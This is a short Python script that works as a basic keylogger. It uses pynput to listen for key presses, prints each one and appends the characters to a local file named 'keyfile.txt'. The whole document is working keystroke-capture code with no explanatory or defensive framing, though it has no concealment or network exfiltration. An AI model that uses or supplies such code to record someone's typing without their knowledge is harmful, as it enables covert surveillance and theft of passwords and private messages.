from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:#opens if there is existing file otherwise make it

        try:
            char = key.char
            logKey.write(char)#writting the pressed key the keyfile.txt
        except:
            print("Error getting char")#incase  inreognizable key is pressed

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()